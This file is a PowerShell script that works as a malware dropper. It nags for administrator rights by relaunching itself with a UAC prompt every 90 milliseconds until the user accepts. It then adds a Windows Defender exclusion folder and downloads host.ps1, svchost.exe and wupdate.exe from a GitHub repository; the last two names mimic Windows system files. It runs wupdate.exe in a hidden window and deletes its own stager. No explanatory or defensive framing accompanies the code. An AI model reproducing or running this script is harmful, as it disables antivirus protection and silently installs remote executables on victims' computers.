$ErrorActionPreference = "SilentlyContinue"

$isAdmin = ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $self = Join-Path $env:TEMP "stage_$([guid]::NewGuid().ToString('N')).ps1"
    $body = @'
$ErrorActionPreference = "SilentlyContinue"

$targetDir = Join-Path $env:LOCALAPPDATA "LUU"
New-Item -ItemType Directory -Path $targetDir -Force | Out-Null

if (-not ([Security.Principal.WindowsPrincipal] `
    [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    exit 1
}

Add-MpPreference -ExclusionPath $targetDir -ErrorAction Continue

$repoBase = "https://raw.githubusercontent.com/westoakstudios/LUU/main"
$files = @(
    @{ Name = "host.ps1";    Url = "$repoBase/host.ps1"    }
    @{ Name = "svchost.exe"; Url = "$repoBase/svchost.exe" }
    @{ Name = "wupdate.exe"; Url = "$repoBase/wupdate.exe" }
)
foreach ($f in $files) {
    $dest = Join-Path $targetDir $f.Name
    try { Invoke-WebRequest -Uri $f.Url -OutFile $dest -UseBasicParsing } catch { }
}

$launcher = Join-Path $targetDir "wupdate.exe"
if (Test-Path -LiteralPath $launcher) {
    Start-Process -FilePath $launcher -WorkingDirectory $targetDir -WindowStyle Hidden
}
'@
    Set-Content -LiteralPath $self -Value $body -Encoding UTF8

    $argLine = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$self`""

    while ($true) {
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName        = "powershell.exe"
        $psi.Arguments       = $argLine
        $psi.Verb            = "runas"
        $psi.UseShellExecute = $true
        $psi.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
        try {
            $p = [System.Diagnostics.Process]::Start($psi)
            $p.WaitForExit()
            Remove-Item -LiteralPath $self -Force -ErrorAction SilentlyContinue
            exit
        } catch {
            Start-Sleep -Milliseconds 90
            continue
        }
    }
}
